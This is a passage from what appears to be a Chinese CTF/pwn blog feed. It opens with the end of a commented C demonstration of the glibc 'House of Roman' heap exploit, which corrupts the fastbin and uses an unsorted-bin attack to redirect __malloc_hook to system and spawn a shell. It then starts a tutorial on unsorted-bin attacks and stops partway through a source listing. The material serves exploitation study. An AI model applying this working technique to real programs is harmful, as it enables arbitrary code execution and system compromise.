put this into the 0x70 fastbin later. </span></span><br><span class="line"><span class="comment">This has to be the same size because the __malloc_hook fake </span></span><br><span class="line"><span class="comment">chunk (used later) uses the fastbin size of 0x7f. There is</span></span><br><span class="line"><span class="comment"> a security check (within malloc) that the size of the chunk matches the fastbin size.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n&quot;</span>);</span><br><span class="line"><span class="comment">//Offset 0x100. Has main_arena + 0x68 in fd and bk.</span></span><br><span class="line"><span class="type">uint8_t</span>* fake_libc_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//// <span class="doctag">NOTE:</span> This is NOT part of the exploit... \\\</span></span><br><span class="line"><span class="comment">// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. </span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> __malloc_hook = ((<span class="type">long</span>*)fake_libc_chunk)[<span class="number">0</span>] - <span class="number">0xe8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// We need the filler because the overwrite below needs </span></span><br><span class="line"><span class="comment">// to have a ptr in the fd slot in order to work. </span></span><br><span class="line"><span class="comment">//Freeing this chunk puts a chunk in the fd slot of &#x27;fastbin_victim&#x27; to be used later. </span></span><br><span class="line"><span class="built_in">free</span>(relative_offset_heap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    Create a UAF on the chunk. Recall that the chunk that fastbin_victim </span></span><br><span class="line"><span class="comment">points to is currently at the offset 0x190 (heap_relative_offset).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="built_in">free</span>(fastbin_victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Now, we start doing the relative overwrites, since that we have </span></span><br><span class="line"><span class="comment">the pointers in their proper locations. The layout is very important to </span></span><br><span class="line"><span class="comment">understand for this.</span></span><br><span class="line"><span class="comment">Current heap layout: </span></span><br><span class="line"><span class="comment">0x0:   fastbin_victim       - size 0x70 </span></span><br><span class="line"><span class="comment">0x70:  alignment_filler     - size 0x90</span></span><br><span class="line"><span class="comment">0x100: fake_libc_chunk      - size 0x70</span></span><br><span class="line"><span class="comment">0x170: leftover_main        - size 0x20</span></span><br><span class="line"><span class="comment">0x190: relative_offset_heap - size 0x70 </span></span><br><span class="line"><span class="comment">bin layout: </span></span><br><span class="line"><span class="comment">fastbin:  fastbin_victim -&gt; relative_offset_heap</span></span><br><span class="line"><span class="comment">unsorted: leftover_main</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Now, the relative overwriting begins:</span></span><br><span class="line"><span class="comment">Recall that fastbin_victim points to relative_offset_heap </span></span><br><span class="line"><span class="comment">(which is in the 0x100-0x200 offset range). The fastbin uses a singly </span></span><br><span class="line"><span class="comment">linked list, with the next chunk in the &#x27;fd&#x27; slot.</span></span><br><span class="line"><span class="comment">By *partially* editing the fastbin_victim&#x27;s last byte (from 0x90 </span></span><br><span class="line"><span class="comment">to 0x00) we have moved the fd pointer of fastbin_victim to </span></span><br><span class="line"><span class="comment">fake_libc_chunk (at offset 0x100).</span></span><br><span class="line"><span class="comment">Also, recall that fake_libc_chunk had previously been in the unsorted_bin. </span></span><br><span class="line"><span class="comment">Because of this, it has a fd pointer that points to main_arena + 0x68. </span></span><br><span class="line"><span class="comment">Now, the fastbin looks like the following: </span></span><br><span class="line"><span class="comment">fastbin_victim -&gt; fake_libc_chunk -&gt;(main_arena + 0x68).</span></span><br><span class="line"><span class="comment">The relative overwrites (mentioned above) will be demonstrates step by step below.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\</span></span><br><span class="line"><span class="string">to the chunk with the LibC address\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fastbin 0x70 now looks like this:\n\</span></span><br><span class="line"><span class="string">heap_addr -&gt; heap_addr2 -&gt; LibC_main_arena\n&quot;</span>);</span><br><span class="line">fastbin_victim[<span class="number">0</span>] = <span class="number">0x00</span>; <span class="comment">// The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Now, we have a fastbin that looks like the following: </span></span><br><span class="line"><span class="comment">0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (main_arena + 0x68)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">We want the fd ptr in fake_libc_chunk to point to something useful. </span></span><br><span class="line"><span class="comment">So, let&#x27;s edit this to point to the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">This way, we can get control of a function ptr.</span></span><br><span class="line"><span class="comment">To do this, we need a valid malloc size. Within the __memalign_hook </span></span><br><span class="line"><span class="comment">is usually an address that usually starts with 0x7f. </span></span><br><span class="line"><span class="comment">Because __memalign_hook value is right before this are all 0s, </span></span><br><span class="line"><span class="comment">we could use a misaligned chunk to get this to work as a valid size in </span></span><br><span class="line"><span class="comment">the 0x70 fastbin.</span></span><br><span class="line"><span class="comment">This is where the first 4 bits of randomness come into play. </span></span><br><span class="line"><span class="comment">The first 12 bits of the LibC address are deterministic for the address. </span></span><br><span class="line"><span class="comment">However, the next 4 (for a total of 2 bytes) are not. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">So, we have to brute force 2^4 different possibilities (16) </span></span><br><span class="line"><span class="comment">in order to get this in the correct location. This &#x27;location&#x27; </span></span><br><span class="line"><span class="comment">is different for each version of GLibC (should be noted).</span></span><br><span class="line"><span class="comment">After doing this relative overwrite, the fastbin looks like the following:</span></span><br><span class="line"><span class="comment">0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (__malloc_hook - 0x23).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Relatively overwrite the main_arena pointer to point to a valid </span></span><br><span class="line"><span class="comment">chunk close to __malloc_hook.</span></span><br><span class="line"><span class="comment">///// <span class="doctag">NOTE:</span> In order to make this exploit consistent </span></span><br><span class="line"><span class="comment">(not brute forcing with hardcoded offsets), we MANUALLY set the values. \\\</span></span><br><span class="line"><span class="comment">In the actual attack, this values would need to be specific </span></span><br><span class="line"><span class="comment">to a version and some of the bits would have to be brute forced </span></span><br><span class="line"><span class="comment">(depending on the bits).</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Use a relative overwrite on the main_arena pointer in the fastbin.\n\</span></span><br><span class="line"><span class="string">Point this close to __malloc_hook in order to create a fake fastbin chunk\n&quot;</span>);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> __malloc_hook_adjust = __malloc_hook - <span class="number">0x23</span>; <span class="comment">// We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The relative overwrite</span></span><br><span class="line"><span class="type">int8_t</span> byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; </span><br><span class="line"><span class="type">int8_t</span> byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line">fake_libc_chunk[<span class="number">0</span>] = byte1; <span class="comment">// Least significant bytes of the address.</span></span><br><span class="line">fake_libc_chunk[<span class="number">1</span>] = byte2; <span class="comment">// The upper most 4 bits of this must be brute forced in a real attack.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Two filler chunks prior to the __malloc_hook chunk in the fastbin. </span></span><br><span class="line"><span class="comment">// These are fastbin_victim and fake_libc_chunk.</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Get the fake chunk pointing close to __malloc_hook\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">In a real exploit, this would fail 15/16 times\n\</span></span><br><span class="line"><span class="string">because of the final half byet of the malloc_hook being random\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If the 4 bit brute force did not work, this will crash because </span></span><br><span class="line"><span class="comment">// of the chunk size not matching the bin for the chunk. </span></span><br><span class="line"><span class="comment">// Otherwise, the next step of the attack can begin.</span></span><br><span class="line"><span class="type">uint8_t</span>* malloc_hook_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Passed step 1 =)\n\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Part 2: Unsorted_bin attack </span></span><br><span class="line"><span class="comment">Now, we have control over the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">However, we do not know the address of LibC still. So, we cannot </span></span><br><span class="line"><span class="comment">do much with this attack. In order to pop a shell, we need </span></span><br><span class="line"><span class="comment">to get an address at the location of the __malloc_hook.</span></span><br><span class="line"><span class="comment">We will use the unsorted_bin attack in order to change the value </span></span><br><span class="line"><span class="comment">of the __malloc_hook with the address of main_arena + 0x68. </span></span><br><span class="line"><span class="comment">For more information on the unsorted_bin attack, review </span></span><br><span class="line"><span class="comment">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c.</span></span><br><span class="line"><span class="comment">For a brief overview, the unsorted_bin attack allows us to write</span></span><br><span class="line"><span class="comment">main_arena + 0x68 to any location by altering the chunk-&gt;bk of</span></span><br><span class="line"><span class="comment">an unsorted_bin chunk. We will choose to write this to the </span></span><br><span class="line"><span class="comment">location of __malloc_hook.</span></span><br><span class="line"><span class="comment">After we overwrite __malloc_hook with the main_arena, we will </span></span><br><span class="line"><span class="comment">edit the pointer (with a relative overwrite) to point to a </span></span><br><span class="line"><span class="comment">one_gadget for immediate code execution.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Again, this relative overwrite works well but requires an additional </span></span><br><span class="line"><span class="comment">1 byte (8 bits) of brute force.</span></span><br><span class="line"><span class="comment">This brings the chances of a successful attempt up to 12 bits of </span></span><br><span class="line"><span class="comment">randomness. This has about a 1/4096 or a 0.0244% chance of working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The steps for phase two of the attack are explained as we go below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Start Step 2: Unsorted_bin attack\n\n\</span></span><br><span class="line"><span class="string">The unsorted bin attack gives us the ability to write a\n\</span></span><br><span class="line"><span class="string">large value to ANY location. But, we do not control the value\n\</span></span><br><span class="line"><span class="string">This value is always main_arena + 0x68. \n\</span></span><br><span class="line"><span class="string">We point the unsorted_bin attack to __malloc_hook for a \n\</span></span><br><span class="line"><span class="string">relative overwrite later.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span>* unsorted_bin_ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// Don&#x27;t want to consolidate</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Put chunk into unsorted_bin\n&quot;</span>);</span><br><span class="line"><span class="comment">// Free the chunk to create the UAF</span></span><br><span class="line"><span class="built_in">free</span>(unsorted_bin_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* /// <span class="doctag">NOTE:</span> The last 4 bits of byte2 would have been brute forced earlier. \\\ </span></span><br><span class="line"><span class="comment"> However, for the sake of example, this has been calculated dynamically. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">__malloc_hook_adjust = __malloc_hook - <span class="number">0x10</span>; <span class="comment">// This subtract 0x10 is needed because of the chunk-&gt;fd doing the actual overwrite on the unsorted_bin attack.</span></span><br><span class="line">byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; </span><br><span class="line">byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Use another relative offset to overwrite the ptr of the chunk-&gt;bk pointer.</span></span><br><span class="line"><span class="comment">// From the previous brute force (4 bits from before) we </span></span><br><span class="line"><span class="comment">// know where the location of this is at. It is 5 bytes away from __malloc_hook.</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Overwrite last two bytes of the chunk to point to __malloc_hook\n&quot;</span>);</span><br><span class="line">unsorted_bin_ptr[<span class="number">8</span>] = byte1; <span class="comment">// Byte 0 of bk. </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// //// <span class="doctag">NOTE:</span> Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///</span></span><br><span class="line">unsorted_bin_ptr[<span class="number">9</span>] = byte2; <span class="comment">// Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Trigger the unsorted bin attack.</span></span><br><span class="line"><span class="comment">This will write the value of (main_arena + 0x68) to whatever is in the bk ptr + 0x10.</span></span><br><span class="line"><span class="comment">A few things do happen though: </span></span><br><span class="line"><span class="comment">- This makes the unsorted bin (hence, small and large too) </span></span><br><span class="line"><span class="comment">   unusable. So, only allocations previously in the fastbin can only be used now.</span></span><br><span class="line"><span class="comment">- If the same size chunk (the unsorted_bin attack chunk) </span></span><br><span class="line"><span class="comment">   is NOT malloc&#x27;ed, the program will crash immediately afterwards. </span></span><br><span class="line"><span class="comment">   So, the allocation request must be the same as the unsorted_bin chunk.</span></span><br><span class="line"><span class="comment">The first point is totally fine (in this attack). But, in more complicated </span></span><br><span class="line"><span class="comment">programming, this can be an issue.</span></span><br><span class="line"><span class="comment">The second just requires us to do the same size allocaton as the current chunk.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Trigger the unsorted_bin attack\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> system_addr = (<span class="type">long</span> <span class="type">long</span>)dlsym(RTLD_NEXT, <span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Passed step 2 =)\n\n\n&quot;</span>);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Step 3: Set __malloc_hook to system</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The chunk itself is allocated 19 bytes away from __malloc_hook. </span></span><br><span class="line"><span class="comment">So, we use a realtive overwrite (again) in order to partially overwrite </span></span><br><span class="line"><span class="comment">the main_arena pointer (from unsorted_bin attack) to point to system.</span></span><br><span class="line"><span class="comment">In a real attack, the first 12 bits are static (per version). </span></span><br><span class="line"><span class="comment">But, after that, the next 12 bits must be brute forced. </span></span><br><span class="line"><span class="comment">/// <span class="doctag">NOTE:</span> For the sake of example, we will be setting these values, instead of brute forcing them. \\\</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 3: Set __malloc_hook to system/one_gadget\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\</span></span><br><span class="line"><span class="string">we can use a relative overwrite to point this to system or a one_gadget.\n\</span></span><br><span class="line"><span class="string">Note: In a real attack, this would be where the last 8 bits of brute forcing\n\</span></span><br><span class="line"><span class="string">comes from.\n&quot;</span>);</span><br><span class="line">malloc_hook_chunk[<span class="number">19</span>] = system_addr &amp; <span class="number">0xff</span>; <span class="comment">// The first 12 bits are static (per version).</span></span><br><span class="line"></span><br><span class="line">malloc_hook_chunk[<span class="number">20</span>] = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last 4 bits of this must be brute forced (done previously already).</span></span><br><span class="line">malloc_hook_chunk[<span class="number">21</span>] = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last byte is the remaining 8 bits that must be brute forced.</span></span><br><span class="line">malloc_hook_chunk[<span class="number">22</span>] = (system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>; <span class="comment">// If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.</span></span><br><span class="line"><span class="comment">// In a real example, you would probably want to use a one_gadget. </span></span><br><span class="line"><span class="comment">// But, to keep things portable, we will just use system and add a pointer to /bin/sh as the parameter</span></span><br><span class="line"><span class="comment">// Although this is kind of cheating (the binary is PIE), if the binary was not PIE having a pointer into the .bss section would work without a single leak. </span></span><br><span class="line"><span class="comment">// To get the system address (eariler on for consistency), the binary must be PIE though. So, the address is put in here.</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Pop Shell!&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>((<span class="type">long</span> <span class="type">long</span>)shell);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用与调试"><a href="#利用与调试" class="headerlink" title="利用与调试"></a>利用与调试</h2><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h1 id="house_of_roman_level1"><a href="#house-of-roman-level1" class="headerlink" title="house_of_roman_level1"></a>house_of_roman_level1</h1>]]></content>
    
    
    <summary type="html">前言：学完unsorted_bin_attack后看到这个组合技,发现可以先学争取学完.</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆unsorted_bin_attack2</title>
    <link href="http://iyheart.github.io/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/"/>
    <id>http://iyheart.github.io/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/</id>
    <published>2025-03-26T01:25:04.000Z</published>
    <updated>2025-03-27T14:28:35.675Z</updated>
    
    <content type="html"><![CDATA[<ul><li>之前的<code>unsorted_bin_attack</code>只是一个比较小的技巧，可以用这个技巧泄露<code>libc</code>的地址，而本篇文章的学习是，利用<code>unsorted_bin</code>的管理机制的一些缺陷，从而进行堆利用，进而<code>getshell</code></li><li>在学习<code>unsorted_bin_attack</code>时，我们就要先了解一下<code>unsorted_bin</code>这个链表的管理机制。</li></ul><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><ul><li>在学习过<code>house of lore</code>其实对<code>unsorted_bin_attack</code>的利用就简单非常多。虽然<code>house of lore</code>是针对<code>smallbin</code>的利用。但是确实有助于理解<code>unsorted_bin_attack</code>。</li><li>但是建议还是先从<code>unsorted_bin_attack</code>先入手，再去学习<code>house of lore</code>。</li></ul><h2 id="unsorted_bin运行机制"><a href="#unsorted-bin运行机制" class="headerlink" title="unsorted_bin运行机制"></a>unsorted_bin运行机制</h2><ul><li>我们之前已经了解了利用<code>unsortedbin</code>中的堆块泄露libc的地址。这个泄露的原理就是第一次被放入<code>unsortedbin</code>中的堆块，其<code>fd</code>指针、<code>bk</code>指针指向的是<code>main_arena+88</code>处（其他不同版本的<code>libc</code>偏移可能不同。）</li><li>而我们查看<code>main_arena+88</code>这个位置就会发现，<code>main_arena+88</code>这个位置其实是一个数组的开头。如下图所示，这个数组里面还有很多元素都还没有被使用的上。这个数组被称为<code>bins</code>。</li><li>而其实这个<code>bins</code>就是用来管理<code>unsortedbin</code>、<code>smallbins</code>、<code>largebins</code>这个链表的头结点，与图中管理<code>fastbin</code>链表的头结点数组<code>fastbinsY</code>相似。</li><li>但是<code>bins</code>这个头结点是双向循环链表，这点与<code>fastbin</code>单向链表就有所不同。所以我们的<code>bins[0]</code>就相当于<code>unsortedbin_fd</code>指针，<code>bins[1]</code>就相当于<code>unsortedbin_bk</code>指针。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327005755001.png" alt="image-20250327005755001"></p><ul><li>而我们图中的<code>main_arena</code>就相当于<code>glibc</code>中这个结构体的实例。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327010249397.png" alt="image-20250327010249397"></p><ul><li>接下来我们来简述一下<code>unsortedbin</code>的大致运行机制，之后再画图说明。<ul><li><code>unsortedbin</code>也是通过链表进行组织的，并且<code>unsortedbin</code>是一个双向循环链表的形式。</li><li>与<code>fastbin</code>链表不同的是<code>unsorted_bin</code>链表采用的是<code>FIFO</code>形式也就是（先进先出的形式）。</li><li>当有一个chunk被放入<code>unsorted_bin</code>这个链表中，这个<code>glibc</code>将使用头插法将该堆块，插入靠近<code>unsorted_bin</code>这个头结点的位置（指的是逻辑地址）</li><li>当有一个<code>chunk</code>要被取出时，会从最远离<code>unsorted_bin</code>的堆块开始取（指的是逻辑地址），然后会更新<code>unsorted_bin</code>中的<code>bk</code>指针。因此<code>unsorted bin</code>遍历堆块的时候使用的是<code>bk</code>指针。</li></ul></li><li>接下来画图描述，当没有堆块被放入<code>unsorted_bin</code>中时就会呈现出如下形式，即空空如也</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327011438507.png" alt="image-20250327011438507"></p><ul><li>当有一个堆块被放入<code>unsorted_bin</code>中就会出现如下图所示的双向循环列表。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327011527458.png" alt="image-20250327011527458"></p><ul><li>当有新的<code>chunk</code>被放入到<code>unsortedbin</code>中时，就会使用<code>头插法</code>。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327011903095.png" alt="image-20250327011903095"></p><ul><li>当有堆块要被取出时就会先从<code>chunk1</code>这边取出，然后更新图中的双向循环链表。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327012012497.png" alt="image-20250327012012497"></p><h2 id="相关检查"><a href="#相关检查" class="headerlink" title="相关检查"></a>相关检查</h2><ul><li>以下图的<code>chunk1</code>和<code>chunk2</code>为例子，这时演示的是我们调用<code>malloc</code>申请一个堆块时，如果要从<code>unsorted_bin</code>中取堆块的情况。<ul><li>当我们要取出<code>chunk1</code>的时候，有一个<code>victim</code>会指向<code>chunk1</code>，还有一个<code>bck</code>指针会指向<code>chunk2</code>。</li><li>这时程序先会检查<code>victim</code>的<code>size</code>位，检查<code>size</code>是否小于等于<code>0x10</code>、<code>size</code>是否大于<code>av-&gt;system_mem</code>，经过判断后就会获取<code>victim</code>所指向堆块的<code>size</code>。<ul><li><code>__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</code></li><li><code>`__builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)</code></li></ul></li><li>当<code>malloc</code>申请的堆块大小属于<code>small bin</code>范围中，并且<code>unsorted_bin</code>中的最后一个堆块是<code>unsortedbin</code>中的唯一<code>chunk</code>时，就会优先使用这个块，如果满足条件就会进行切割和解链操作。</li><li>当<code>malloc</code>申请的堆块大小超出<code>unsorted_bin</code>中的最后一个堆块时，则会将<code>victim</code>所指向的<code>chunk</code>根据<code>size</code>位，放入相应的<code>small_bins</code>中或者<code>large_bins</code>中</li><li>并且更新<code>双向循环链表</code>中的<code>unsorted_bin_bk</code>指针和<code>bck-&gt;fd</code>指针。<strong>我们对<code>unsorted_bin_attack</code>的利用重点就是在这里，如果我们可以修改<code>victim</code>的<code>bk</code>指针，修改完改指针后，我们再次调用<code>malloc</code>申请相同大小的堆块，这时<code>unsorted_bin</code>在更新双向循环链表的时候就会修改<code>bk</code>指针所指向的位置，从而将<code>某些值</code>（这个值我们无法控制）写入到我们想要的位置中</strong><ul><li><code>unsorted_chunks (av)-&gt;bk = bck;</code></li><li><code>bck-&gt;fd = unsorted_chunks (av);</code></li></ul></li><li><strong>猜测：由于<code>unsorted_bin</code>链表的管理与<code>smallbin_bin</code>链表的管理差不多，是不是能将<code>house of lore</code>的利用方式是使用在<code>unsorted_bin</code>中呢？</strong></li><li>如果之前的条件都不满足，意味着目前的<code>victim</code>不能满足用户的需求，需要根据其<code>size</code>放入<code>small bin</code>或<code>large bin</code>的链最后是<code>unlink</code>将<code>victim</code>彻底解链。</li></ul></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327011903095.png" alt="image-20250327011903095"></p><h2 id="相关源码"><a href="#相关源码" class="headerlink" title="相关源码"></a>相关源码</h2><details>    <summary>_int_malloc中关于unsorted_bin的源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 